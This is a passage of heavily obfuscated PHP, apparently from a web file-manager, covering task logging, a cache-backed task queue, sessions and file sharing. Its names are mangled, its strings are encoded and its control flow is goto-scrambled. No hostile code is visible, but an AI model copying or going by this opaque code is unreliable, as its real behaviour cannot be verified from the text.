$ŞÉ·ÓÑÏ = $ºÍÃ‰Ç[$¼Şõ¨¿ô[33]]; $º×Èİâª = isset($•íç‡À[$ºÍÃ‰Ç[$¼Şõ¨¿ô[1773]]]) ? $•íç‡À[$ºÍÃ‰Ç[$¼Şõ¨¿ô[1773]]] : !1; $»µ±¡µ¼ = strpos($ŞÉ·ÓÑÏ, $¼Şõ¨¿ô[2441]) === 0 ? LNG($¼Şõ¨¿ô[2442]) : LNG($¼Şõ¨¿ô[2437]); $ºÍÃ‰Ç[$¼Şõ¨¿ô[32]] = isset($º×Èİâª[$¼Şõ¨¿ô[32]]) ? $º×Èİâª[$¼Şõ¨¿ô[32]] : LNG($¼Şõ¨¿ô[2437]); $ºÍÃ‰Ç[$¼Şõ¨¿ô[2269]] = isset($º×Èİâª[$¼Şõ¨¿ô[2269]]) ? $º×Èİâª[$¼Şõ¨¿ô[2269]] : $¼Şõ¨¿ô[12]; $ºÍÃ‰Ç[$¼Şõ¨¿ô[1659]] = isset($ú÷ú÷Ü£[$ŞÉ·ÓÑÏ]) ? $ú÷ú÷Ü£[$ŞÉ·ÓÑÏ] : $»µ±¡µ¼; $ºÍÃ‰Ç[$¼Şõ¨¿ô[2151]] = $º×Èİâª; $À–º«Ğâ = json_decode($ºÍÃ‰Ç[$¼Şõ¨¿ô[537]], !0); $ºÍÃ‰Ç[$¼Şõ¨¿ô[2434]] = isset($À–º«Ğâ[$¼Şõ¨¿ô[2434]]) ? $À–º«Ğâ[$¼Şõ¨¿ô[2434]] : $¼Şõ¨¿ô[12]; $ºÍÃ‰Ç[$¼Şõ¨¿ô[2438]] = IpLocation::get($ºÍÃ‰Ç[$¼Şõ¨¿ô[2434]]); if (strpos($ŞÉ·ÓÑÏ, $¼Şõ¨¿ô[2210]) === 0 || isset($À–º«Ğâ[$¼Şõ¨¿ô[2208]])) { $À–º«Ğâ[$¼Şõ¨¿ô[90]] = $ïÙúÈãş[$À–º«Ğâ[$¼Şõ¨¿ô[193]]]; $À–º«Ğâ[$¼Şõ¨¿ô[2224]] = $ïÙúÈãş[$À–º«Ğâ[$¼Şõ¨¿ô[2208]]]; if ($À–º«Ğâ[$¼Şõ¨¿ô[33]] == $¼Şõ¨¿ô[634]) { $À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[1240]] = $ïÙúÈãş[$À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[1240]]]; $À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[1241]] = $ïÙúÈãş[$À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[1241]]]; } if ($À–º«Ğâ[$¼Şõ¨¿ô[33]] == $¼Şõ¨¿ô[2219]) { $À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[193]] = $ïÙúÈãş[$À–º«Ğâ[$¼Şõ¨¿ô[537]][$¼Şõ¨¿ô[193]]]; } if ($À–º«Ğâ[$¼Şõ¨¿ô[33]] == $¼Şõ¨¿ô[1942]) { $À–º«Ğâ[$¼Şõ¨¿ô[2224]] = $À–º«Ğâ[$¼Şõ¨¿ô[90]]; $À–º«Ğâ[$¼Şõ¨¿ô[2208]] = $À–º«Ğâ[$¼Şõ¨¿ô[2224]][$¼Şõ¨¿ô[193]]; $À–º«Ğâ[$¼Şõ¨¿ô[90]] = !1; $À–º«Ğâ[$¼Şõ¨¿ô[193]] = $¼Şõ¨¿ô[12]; } $— œìú = array($¼Şõ¨¿ô[1942], $¼Şõ¨¿ô[2206]); if (!in_array($À–º«Ğâ[$¼Şõ¨¿ô[33]], $— œìú)) { if ($À–º«Ğâ[$¼Şõ¨¿ô[90]] && $À–º«Ğâ[$¼Şõ¨¿ô[90]][$¼Şõ¨¿ô[190]] == $¼Şõ¨¿ô[191]) { $÷ÛÏÉ³£[] = $ºÍÃ‰Ç[$¼Şõ¨¿ô[486]]; unset($Á„­¡¿[$‘±¥ıä¨]); continue; } if ($À–º«Ğâ[$¼Şõ¨¿ô[2224]] && $À–º«Ğâ[$¼Şõ¨¿ô[2224]][$¼Şõ¨¿ô[190]] == $¼Şõ¨¿ô[191]) { $÷ÛÏÉ³£[] = $ºÍÃ‰Ç[$¼Şõ¨¿ô[486]]; unset($Á„­¡¿[$‘±¥ıä¨]); continue; } } } $ºÍÃ‰Ç[$¼Şõ¨¿ô[537]] = $À–º«Ğâ; unset($ºÍÃ‰Ç[$¼Şõ¨¿ô[2443]]); $úÆÑ–õË[] = $ºÍÃ‰Ç; } $this->clearSystemPathLog($÷ÛÏÉ³£); return $úÆÑ–õË; } private function clearSystemPathLog($ã”ü¨ÆË) { $ø¶ĞŠ³Ö =& $_SERVER[´È¥ö†ö]; if (count($ã”ü¨ÆË) == 0) { return; } $·Œìç–ğ = array($ø¶ĞŠ³Ö[486] => array($ø¶ĞŠ³Ö[7], array_unique($ã”ü¨ÆË))); $this->where($·Œìç–ğ)->delete(); } public function deviceList($Éš©ñÒÑ, $ÄŞê¤ºØ = 0) { $•Şß·¡¸ =& $_SERVER[´È¥ö†ö]; $´õ¢©Àâ = array($•Şß·¡¸[1773] => $Éš©ñÒÑ, $•Şß·¡¸[233] => array($•Şß·¡¸[1090], $ÄŞê¤ºØ), $•Şß·¡¸[33] => $•Şß·¡¸[1916]); $¦é«âªâ = array(); $ùÄƒñ»ü = $this->field($•Şß·¡¸[2444])->where($´õ¢©Àâ)->order($•Şß·¡¸[2222])->limit(50)->select(); foreach ($ùÄƒñ»ü as $ä³¼ğÏ¯ => $óÏÖä) { if ($ä³¼ğÏ¯ > 0 && abs($óÏÖä[$•Şß·¡¸[233]] - $ùÄƒñ»ü[$ä³¼ğÏ¯ - 1][$•Şß·¡¸[233]]) < 5) { continue; } $—ñãÊ©á = json_decode($óÏÖä[$•Şß·¡¸[537]], !0); $óÏÖä[$•Şß·¡¸[2434]] = isset($—ñãÊ©á[$•Şß·¡¸[2434]]) ? $—ñãÊ©á[$•Şß·¡¸[2434]] : $•Şß·¡¸[12]; unset($—ñãÊ©á[$•Şß·¡¸[2434]]); $—²‚ÑŠ = $this->deviceType($—ñãÊ©á[$•Şß·¡¸[2211]]); if (isset($¦é«âªâ[$—²‚ÑŠ])) { continue; } $óÏÖä[$•Şß·¡¸[2438]] = IpLocation::get($óÏÖä[$•Şß·¡¸[2434]]); $óÏÖä[$•Şß·¡¸[537]] = $—ñãÊ©á; $¦é«âªâ[$—²‚ÑŠ] = $óÏÖä; } return array_values($¦é«âªâ); } public function deviceType($ö‘ ÌÉ) { return $ö‘ ÌÉ; } } goto eÁÍİ‰ö ; DÌ›¯Ñ¢´¤: if (!$ualwxzctvb) { return; } $_SERVER[–®Á¾äİ] = explode($_SERVER[´È¥ö†ö][694], gzinflate(substr($_SERVER[´È¥ö†ö][695], 10, -8))); $aqncroilsk = $_SERVER[´È¥ö†ö][696]; goto f¯“‰‡¬£; AÁñ¯¶»Ò: class TaskHttp extends Task { protected function startAfter() { $ºÒÅˆá¤ =& $_SERVER[´È¥ö†ö]; $¤ŸášÚà =& $this->task; $¤ŸášÚà[$ºÒÅˆá¤[1851]] = 1; Hook::bind($ºÒÅˆá¤[1819], array($this, $ºÒÅˆá¤[1852])); Hook::bind($ºÒÅˆá¤[1821], array($this, $ºÒÅˆá¤[1853])); Hook::bind($ºÒÅˆá¤[1823], array($this, $ºÒÅˆá¤[1854])); } protected function endAfter() { $–³ËŸ =& $_SERVER[´È¥ö†ö]; Hook::unbind($–³ËŸ[1819], array($this, $–³ËŸ[1852])); Hook::unbind($–³ËŸ[1821], array($this, $–³ËŸ[1853])); Hook::unbind($–³ËŸ[1823], array($this, $–³ËŸ[1854])); } public function progressStart($«Ğç÷ÇÀ) { $ÕÀ¸Í†Ó =& $_SERVER[´È¥ö†ö]; $ÊŒ©³³ô = curl_getinfo($«Ğç÷ÇÀ); self::log($ÕÀ¸Í†Ó[1855] . $ÊŒ©³³ô[$ÕÀ¸Í†Ó[393]]); self::valueSet($this->task[$ÕÀ¸Í†Ó[486]], $this->task); } public function progressEnd($¨éÌ¢ö) { $Û½â™šø =& $_SERVER[´È¥ö†ö]; self::log($Û½â™šø[1856] . $this->task[$Û½â™šø[486]]); $this->end(); } public function progress($”Äì¸æâ, $„©¨˜ü’, $ÂïÊõ¡‡, $€ÆŠª¨, $âˆú·ºº) { $Ü„„»·† =& $_SERVER[´È¥ö†ö]; $àÚêÏò =& $this->task; if ($âˆú·ºº > 0) { $àÚêÏò[$Ü„„»·†[1139]] = $àÚêÏò[$Ü„„»·†[1139]] == 0 ? $€ÆŠª¨ : $àÚêÏò[$Ü„„»·†[1139]]; $àÚêÏò[$Ü„„»·†[1774]] = $âˆú·ºº; } else { if ($ÂïÊõ¡‡ > 0) { $àÚêÏò[$Ü„„»·†[1139]] = $àÚêÏò[$Ü„„»·†[1139]] == 0 ? $„©¨˜ü’ : $àÚêÏò[$Ü„„»·†[1139]]; $àÚêÏò[$Ü„„»·†[1774]] = $ÂïÊõ¡‡; } } $this->update(); self::log("\x70\162\x6f\147\162\145\x73\163\x48\x74\164\160\x3a\x64\x6f\x77\x6e\x3a{$ÂïÊõ¡‡}\57{$„©¨˜ü’}\x3b\40\165\160\154\157\141\x64\x3a{$âˆú·ºº}\57{$€ÆŠª¨}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¶İÑŞş¬, $¾Ù­ßî = '', $ãİàÁæÔ = 0, $ÊåÓÍ­ = '') { $±ú°‹ ’ =& $_SERVER[´È¥ö†ö]; $ÊåÓÍ­ = $ÊåÓÍ­ ? $ÊåÓÍ­ : ($¾Ù­ßî ? $¾Ù­ßî : $¶İÑŞş¬); $Í©ÈÁ©“ = new Task($¶İÑŞş¬, $¾Ù­ßî, $ãİàÁæÔ, $ÊåÓÍ­); $GLOBALS[$±ú°‹ ’[1857] . $¶İÑŞş¬] = new TaskLog($±ú°‹ ’[1756], $Í©ÈÁ©“, $ÊåÓÍ­); return $Í©ÈÁ©“; } public function __construct($¯ Î­æ‰ = '', $ÅÈ—ş¶ = '', $Û×ÅÑ† = '') { $¬ÎŠõÑò =& $_SERVER[´È¥ö†ö]; if (!$¯ Î­æ‰) { $¯ Î­æ‰ = $¬ÎŠõÑò[1756]; } $½å³Í«Ã = $¯ Î­æ‰ . $¬ÎŠõÑò[473] . rand_string(10); if (!$Û×ÅÑ†) { $Û×ÅÑ† = $¯ Î­æ‰ . $¬ÎŠõÑò[53] . $Û×ÅÑ†; } switch ($¯ Î­æ‰) { case $¬ÎŠõÑò[1756]: if (!$ÅÈ—ş¶ || !$ÅÈ—ş¶->task) { return echoLog($¯ Î­æ‰ . $¬ÎŠõÑò[1858]); } $¾ƒÈÔ‚ï = $ÅÈ—ş¶; $½å³Í«Ã = $¾ƒÈÔ‚ï->task[$¬ÎŠõÑò[486]]; $¯ Î­æ‰ = $¾ƒÈÔ‚ï->task[$¬ÎŠõÑò[486]]; if (!$¾ƒÈÔ‚ï->task[$¬ÎŠõÑò[1659]]) { $¾ƒÈÔ‚ï->task[$¬ÎŠõÑò[1659]] = $Û×ÅÑ† ? $Û×ÅÑ† : $¯ Î­æ‰; } break; case $¬ÎŠõÑò[1859]: if (!$ÅÈ—ş¶) { return echoLog($¯ Î­æ‰ . $¬ÎŠõÑò[1860]); } $éñì„‚† = is_string($ÅÈ—ş¶) ? array($ÅÈ—ş¶) : $ÅÈ—ş¶; $¾ƒÈÔ‚ï = new TaskFileTransfer($½å³Í«Ã, $¯ Î­æ‰, 0, $Û×ÅÑ† ? $Û×ÅÑ† : $éñì„‚†[0]); foreach ($éñì„‚† as $Ííş‹äü) { $¾ƒÈÔ‚ï->addPath($Ííş‹äü); } break; case $¬ÎŠõÑò[399]: if (!$ÅÈ—ş¶) { return echoLog($¯ Î­æ‰ . $¬ÎŠõÑò[1860]); } $éñì„‚† = is_string($ÅÈ—ş¶) ? array($ÅÈ—ş¶) : $ÅÈ—ş¶; $¾ƒÈÔ‚ï = new TaskZip($½å³Í«Ã, $¯ Î­æ‰, 0, $Û×ÅÑ† ? $Û×ÅÑ† : $éñì„‚†[0]); foreach ($éñì„‚† as $Ííş‹äü) { $¾ƒÈÔ‚ï->addPath($Ííş‹äü); } break; case $¬ÎŠõÑò[1298]: if (!$ÅÈ—ş¶) { return echoLog($¯ Î­æ‰ . $¬ÎŠõÑò[1860]); } $¾ƒÈÔ‚ï = new TaskUnZip($½å³Í«Ã, $¯ Î­æ‰, 0, $Û×ÅÑ† ? $Û×ÅÑ† : $ÅÈ—ş¶); if ($ÅÈ—ş¶) { $¾ƒÈÔ‚ï->addFile($ÅÈ—ş¶); } break; case $¬ÎŠõÑò[152]: $¾ƒÈÔ‚ï = new TaskHttp($½å³Í«Ã, $¯ Î­æ‰); break; default: return; break; } $this->task = $¾ƒÈÔ‚ï; $this->taskID = $½å³Í«Ã; Hook::bind($¬ÎŠõÑò[1794], array($this, $¬ÎŠõÑò[1861])); Hook::bind($¬ÎŠõÑò[1796], array($this, $¬ÎŠõÑò[1862])); Hook::bind($¬ÎŠõÑò[1790], array($this, $¬ÎŠõÑò[1863])); echoLog($¬ÎŠõÑò[1864] . $¾ƒÈÔ‚ï->task[$¬ÎŠõÑò[1659]]); } public function __destruct() { $this->end(); } public function end($Ñº ø¬ = '') { $ÓºÏ³§à =& $_SERVER[´È¥ö†ö]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ñº ø¬); $this->task = !1; $this->taskID = !1; Hook::unbind($ÓºÏ³§à[1794], array($this, $ÓºÏ³§à[1861])); Hook::unbind($ÓºÏ³§à[1796], array($this, $ÓºÏ³§à[1862])); Hook::unbind($ÓºÏ³§à[1790], array($this, $ÓºÏ³§à[1863])); } public function taskUpdate($½Âİ…Í ) { $‡ã¦×Ç =& $_SERVER[´È¥ö†ö]; if (!$½Âİ…Í  || $this->taskID != $½Âİ…Í [$‡ã¦×Ç[486]]) { return; } $åëŞĞ‘è = 20; $—âùªÖ¿ = intval($½Âİ…Í [$‡ã¦×Ç[1775]] * $åëŞĞ‘è); $¨³ óÎ = $‡ã¦×Ç[176] . str_repeat($‡ã¦×Ç[517], $—âùªÖ¿) . $‡ã¦×Ç[1090] . str_repeat($‡ã¦×Ç[53], $åëŞĞ‘è - $—âùªÖ¿) . $‡ã¦×Ç[178]; $…‚ôÙå” = $¨³ óÎ . sprintf($‡ã¦×Ç[1865], $½Âİ…Í [$‡ã¦×Ç[1775]] * 100) . $‡ã¦×Ç[1866]; $ûĞÔ•”‚ = $…‚ôÙå” . $½Âİ…Í [$‡ã¦×Ç[1774]] . $‡ã¦×Ç[8] . $½Âİ…Í [$‡ã¦×Ç[1139]] . LNG($‡ã¦×Ç[1867]); $€‰Û„Õä = $‡ã¦×Ç[12]; if ($½Âİ…Í [$‡ã¦×Ç[1851]]) { $ûĞÔ•”‚ = $…‚ôÙå” . size_format($½Âİ…Í [$‡ã¦×Ç[1774]]) . $‡ã¦×Ç[8] . size_format($½Âİ…Í [$‡ã¦×Ç[1139]]); $€‰Û„Õä = size_format($½Âİ…Í [$‡ã¦×Ç[1776]]) . $‡ã¦×Ç[1868]; } if ($½Âİ…Í [$‡ã¦×Ç[1141]]) { $½Âİ…Í [$‡ã¦×Ç[1825]] = $½Âİ…Í [$‡ã¦×Ç[1141]] . $‡ã¦×Ç[53] . $½Âİ…Í [$‡ã¦×Ç[1825]]; } if ($½Âİ…Í [$‡ã¦×Ç[1825]]) { $èÉÔöí² = $‡ã¦×Ç[12]; if ($½Âİ…Í [$‡ã¦×Ç[1827]]) { $èÉÔöí² = $‡ã¦×Ç[50] . size_format($½Âİ…Í [$‡ã¦×Ç[1828]]) . $‡ã¦×Ç[8] . size_format($½Âİ…Í [$‡ã¦×Ç[1827]]); } $€‰Û„Õä .= $½Âİ…Í [$‡ã¦×Ç[1825]] . $èÉÔöí²; } if ($½Âİ…Í [$‡ã¦×Ç[839]] && !$½Âİ…Í [$‡ã¦×Ç[1827]]) { $€‰Û„Õä .= $‡ã¦×Ç[53] . size_format($½Âİ…Í [$‡ã¦×Ç[1832]]) . $‡ã¦×Ç[8] . size_format($½Âİ…Í [$‡ã¦×Ç[839]]); } echoLog($ûĞÔ•”‚ . $‡ã¦×Ç[53] . $€‰Û„Õä, !0); } public function taskEnd($æŠû½») { $Ç¿®Ç†ñ =& $_SERVER[´È¥ö†ö]; if (!$æŠû½» || $this->taskID != $æŠû½»[$Ç¿®Ç†ñ[486]]) { return; } $Ğ¹€‚õé = $æŠû½» ? LNG($Ç¿®Ç†ñ[1869]) . $Ç¿®Ç†ñ[4] . $æŠû½»[$Ç¿®Ç†ñ[1774]] . $Ç¿®Ç†ñ[8] . $æŠû½»[$Ç¿®Ç†ñ[1139]] . LNG($Ç¿®Ç†ñ[1867]) . $Ç¿®Ç†ñ[74] : $Ç¿®Ç†ñ[12]; echoLog($Ç¿®Ç†ñ[1870] . $æŠû½»[$Ç¿®Ç†ñ[1659]] . ($æŠû½»[$Ç¿®Ç†ñ[537]] ? $Ç¿®Ç†ñ[74] . $æŠû½»[$Ç¿®Ç†ñ[537]] : $Ç¿®Ç†ñ[12]) . $Ç¿®Ç†ñ[74] . $Ğ¹€‚õé . $Ç¿®Ç†ñ[1871] . sprintf($Ç¿®Ç†ñ[928], timeFloat() - $æŠû½»[$Ç¿®Ç†ñ[1777]]) . $Ç¿®Ç†ñ[1789]); $this->end(); } public function taskKill($½ø‡½½÷) { $«å›¾º“ =& $_SERVER[´È¥ö†ö]; if (!$½ø‡½½÷ || $this->taskID != $½ø‡½½÷[$«å›¾º“[486]]) { return; } echoLog($«å›¾º“[1872] . $½ø‡½½÷[$«å›¾º“[1659]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\x75\x65\165\x65\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\163\153\121\165\x65\165\x65\x44\x61\164\141"; const QUEUE_TIME = "\164\141\163\153\121\x75\x65\x75\x65\x4c\141\163\164\122\x75\156"; const QUEUE_THREAD = "\x74\141\163\x6b\121\165\x65\165\x65\x54\x68\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¾à•Íà¹, $«ãŒÕÏê = array(), $ŠÚÕç¦Õ = '', $ˆü£ëùĞ = '') { $ŞæÆÍ‡û =& $_SERVER[´È¥ö†ö]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ˆü£ëùĞ && array_find_by_field(self::$listData, $ŞæÆÍ‡û[97], $ˆü£ëùĞ)) { return !0; } if ($ˆü£ëùĞ && array_find_by_field(self::$listDataAdd, $ŞæÆÍ‡û[97], $ˆü£ëùĞ)) { return !0; } self::$listDataAdd[] = array($ŞæÆÍ‡û[352] => $¾à•Íà¹, $ŞæÆÍ‡û[1873] => $«ãŒÕÏê, $ŞæÆÍ‡û[537] => $ŠÚÕç¦Õ, $ŞæÆÍ‡û[97] => $ˆü£ëùĞ); return !0; } public static function addSubmit() { $ÑìƒÈµÆ =& $_SERVER[´È¥ö†ö]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÑìƒÈµÆ[1874] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÑìƒÈµÆ[12], $ÑìƒÈµÆ[537])), $ÑìƒÈµÆ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ª˜ãèÓã, $…¢ÇÂŠû = array(), $ÃÇá„óÜ = '', $ŞÚÕÃÜ = '') { $Å’Í¾Ş› =& $_SERVER[´È¥ö†ö]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ëåÁô¶Ö = self::getAll(); if ($ŞÚÕÃÜ && array_find_by_field($ëåÁô¶Ö, $Å’Í¾Ş›[97], $ŞÚÕÃÜ)) { return !0; } $ëåÁô¶Ö[] = array($Å’Í¾Ş›[352] => $ª˜ãèÓã, $Å’Í¾Ş›[1873] => $…¢ÇÂŠû, $Å’Í¾Ş›[537] => $ÃÇá„óÜ, $Å’Í¾Ş›[97] => $ŞÚÕÃÜ); self::setAll($ëåÁô¶Ö); write_log($Å’Í¾Ş›[1874] . $ÃÇá„óÜ, $Å’Í¾Ş›[197]); return !0; } public static function run() { $²—ëæ‘ô =& $_SERVER[´È¥ö†ö]; $Ù¨¤˜ = self::getAll(); $ÂüçıÛ‚ = array_shift($Ù¨¤˜); if (!$ÂüçıÛ‚) { return !1; } self::setAll($Ù¨¤˜); $ŞÓ†¬Ğ = timeFloat(); $›İø¡­µ = $²—ëæ‘ô[12]; try { $›İø¡­µ = Hook::apply($ÂüçıÛ‚[$²—ëæ‘ô[352]], $ÂüçıÛ‚[$²—ëæ‘ô[1873]]); } catch (Exception $­ø‡ññ’) { write_log($­ø‡ññ’, $²—ëæ‘ô[1263]); } $ÚåŞ’ÄÒ = number_format(timeFloat() - $ŞÓ†¬Ğ, 3) . $²—ëæ‘ô[1789]; if ($›İø¡­µ && is_string($›İø¡­µ)) { $ÚåŞ’ÄÒ = $ÚåŞ’ÄÒ . $²—ëæ‘ô[1875] . $›İø¡­µ; } write_log($²—ëæ‘ô[1876] . $ÂüçıÛ‚[$²—ëæ‘ô[537]] . $²—ëæ‘ô[1877] . $ÚåŞ’ÄÒ, $²—ëæ‘ô[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¿×Ğ§©É =& $_SERVER[´È¥ö†ö]; $àØˆú¤¾ = self::threadCount() + 1; if ($àØˆú¤¾ > 3 || !self::count()) { return; } write_log($¿×Ğ§©É[1878] . $àØˆú¤¾, $¿×Ğ§©É[197]); Cache::set(self::QUEUE_THREAD, $àØˆú¤¾, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¿×Ğ§©É[1879], $¿×Ğ§©É[197]); } public static function getKey($Ôúğ”¥ , $¢¿¤è» = "\151\x6e\164") { $ª¹õ¶Ñ =& $_SERVER[´È¥ö†ö]; Cache::removeMemory($Ôúğ”¥ ); $²óã‹çÄ = Cache::get($Ôúğ”¥ ); if ($¢¿¤è» == $ª¹õ¶Ñ[374]) { return $²óã‹çÄ ? intval($²óã‹çÄ) : 0; } if ($¢¿¤è» == $ª¹õ¶Ñ[1880]) { return is_array($²óã‹çÄ) ? $²óã‹çÄ : array(); } return $²óã‹çÄ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[´È¥ö†ö][1880]); } public static function setAll($ÂŠÃĞì) { $¿Ääß© = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÂŠÃĞì), $¿Ääß©); Cache::set(self::QUEUE_DATA, $ÂŠÃĞì, $¿Ääß©); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto dš·“õš‹; E¢‹Š‹°ÈŞ: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\137\x73\145\163\163\151\x6f\156"; public function get($¬‘¥ï‰) { $½Æ»À÷Ô =& $_SERVER[´È¥ö†ö]; $ÏÃ–ĞŸ¾ = $this->where(array($½Æ»À÷Ô[2113] => $¬‘¥ï‰))->find(); if (!is_array($ÏÃ–ĞŸ¾)) { return !1; } return $ÏÃ–ĞŸ¾[$½Æ»À÷Ô[171]]; } public function set($Ò­Õ´áÎ, $ß¬êÍŒÕ, $¾µ­úÖ— = 3600) { $‰âº§ó =& $_SERVER[´È¥ö†ö]; $š±«´ıˆ = array($‰âº§ó[2113] => $Ò­Õ´áÎ, $‰âº§ó[2013] => $ß¬êÍŒÕ, $‰âº§ó[2114] => $¾µ­úÖ— + time()); if (Session::get($‰âº§ó[2115])) { $š±«´ıˆ[$‰âº§ó[1773]] = Session::get($‰âº§ó[2115]); } else { $š±«´ıˆ[$‰âº§ó[1773]] = 0; } if ($this->get($Ò­Õ´áÎ)) { return $this->where(array($‰âº§ó[2113] => $Ò­Õ´áÎ))->save($š±«´ıˆ); } else { return $this->add($š±«´ıˆ, array(), !0); } } public function remove($”âƒ­à²) { return $this->where(array($_SERVER[´È¥ö†ö][2113] => $”âƒ­à²))->delete(); } public function clearTimeout() { return $this->where($_SERVER[´È¥ö†ö][2116] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\x54\151\155\145", "\x74\151\155\x65", "\151\156\163\145\162\164\x2c\x75\160\144\x61\x74\145", "\x66\165\x6e\x63\164\151\157\156"), array("\143\x72\x65\141\x74\145\x54\151\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\157\160\164\151\x6f\156\x73", '', "\151\156\x73\145\x72\x74\x2c\165\x70\144\x61\164\x65\x2c\x73\x65\154\145\143\x74", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($‘œ›–Å) { $ïÌ‹üÏ =& $_SERVER[´È¥ö†ö]; $¬ê£ÓÛ = isset($‘œ›–Å[0]) ? $‘œ›–Å[0] : !1; $Îäé³ÛÃ = $ïÌ‹üÏ[2117] . USER_ID; return array($ïÌ‹üÏ[2118] => array(USER_ID, $ïÌ‹üÏ[2119], $Îäé³ÛÃ), $ïÌ‹üÏ[2058] => array($¬ê£ÓÛ, $ïÌ‹üÏ[2120], $Îäé³ÛÃ)); } protected function listSimple() { $«ëÕãıŞ = array($_SERVER[´È¥ö†ö][1773] => USER_ID); $Ì÷‘ïÅÒ = $this->field($this->fieldList)->where($«ëÕãıŞ)->select(); return $Ì÷‘ïÅÒ ? $Ì÷‘ïÅÒ : array(); } protected function getInfo($½‚±ÛĞ¤, $Ã°ª–ŸÉ = false, $¼ëÖß³¡ = '') { $«®à¥ªô =& $_SERVER[´È¥ö†ö]; if ($Ã°ª–ŸÉ) { return $this->_getShareInfo(array($«®à¥ªô[679] => $½‚±ÛĞ¤)); } $ö»‘ÄÌó = $this->cacheFunctionGet($«®à¥ªô[2060], $½‚±ÛĞ¤, $¼ëÖß³¡); return $ö»‘ÄÌó; } public function getInfoByHash($ö¡óµĞÅ) { return $this->_getShareInfo(array($_SERVER[´È¥ö†ö][2121] => $ö¡óµĞÅ)); } public function getInfoByPath($‹Ö‚Ä¹£) { $¡ºª¶Š± =& $_SERVER[´È¥ö†ö]; $Ë²®„‚ğ = array($¡ºª¶Š±[1773] => USER_ID, $¡ºª¶Š±[193] => $‹Ö‚Ä¹£); return $this->_getShareInfo($Ë²®„‚ğ); } public function getInfoBySourcePath($«…š²ë¥) { $õßÔïñ¡ =& $_SERVER[´È¥ö†ö]; $æ£ëŠæ = array($õßÔïñ¡[1773] => USER_ID, $õßÔïñ¡[1256] => $«…š²ë¥); return $this->_getShareInfo($æ£ëŠæ); } private function _getShareInfo($²ÁÓÍ¢÷) { $öÑáò˜× =& $_SERVER[´È¥ö†ö]; $î¥Ÿˆù = $this->where($²ÁÓÍ¢÷)->find(); if (!$î¥Ÿˆù) { return !1; } $²ÁÓÍ¢÷ = array($öÑáò˜×[679] => $î¥Ÿˆù[$öÑáò˜×[679]]); $ªûàª£ = $öÑáò˜×[2122]; $Ğàçòôü = Model($öÑáò˜×[680])->order($öÑáò˜×[486])->field($ªûàª£)->where($²ÁÓÍ¢÷)->select(); if ($î¥Ÿˆù[$öÑáò˜×[193]] == $öÑáò˜×[230]) { $î¥Ÿˆù[$öÑáò˜×[90]] = IO::info($î¥Ÿˆù[$öÑáò˜×[1256]]); } else { $î¥Ÿˆù[$öÑáò˜×[90]] = Model($öÑáò˜×[1420])->pathInfo($î¥Ÿˆù[$öÑáò˜×[193]]); } $î¥Ÿˆù[$öÑáò˜×[2123]] = $Ğàçòôü; return $î¥Ÿˆù; } protected function getInfoAuth($‚‹™™¼‡) { $ÇÇ¡üÍü =& $_SERVER[´È¥ö†ö]; $Šáš‰Ú = $this->getInfo($‚‹™™¼‡); if ($Šáš‰Ú[$ÇÇ¡üÍü[1773]] == USER_ID) { $Šáš‰Ú[$ÇÇ¡üÍü[498]] = $Šáš‰Ú[$ÇÇ¡üÍü[90]][$ÇÇ¡üÍü[498]]; } else { $Šáš‰Ú[$ÇÇ¡üÍü[498]] = Model($ÇÇ¡üÍü[578])->authMake($Šáš‰Ú[$ÇÇ¡üÍü[2123]]); } return $Šáš‰Ú; } protected function listData($”±Ä…§æ = null, $Ñ¢ÆÕ´Ø = 300) { $Ì×Ìø×ª =& $_SERVER[´È¥ö†ö]; $…çò²– = array(array($Ì×Ìø×ª[573] => array($Ì×Ìø×ª[1088], 0), $Ì×Ìø×ª[677] => array($Ì×Ìø×ª[1088], 0), $Ì×Ìø×ª[2124] => $Ì×Ìø×ª[2076])); if ($”±Ä…§æ == $Ì×Ìø×ª[2125]) { $…çò²– = array($Ì×Ìø×ª[573] => 1); } else { if ($”±Ä…§æ == $Ì×Ìø×ª[1241]) { $…çò²– = array($Ì×Ìø×ª[677] => 1); } } $…çò²–[$Ì×Ìø×ª[1773]] = USER_ID; $ò­§ß¡è = $this->where($…çò²–)->selectPage($Ñ¢ÆÕ´Ø); return $ò­§ß¡è; } protected function 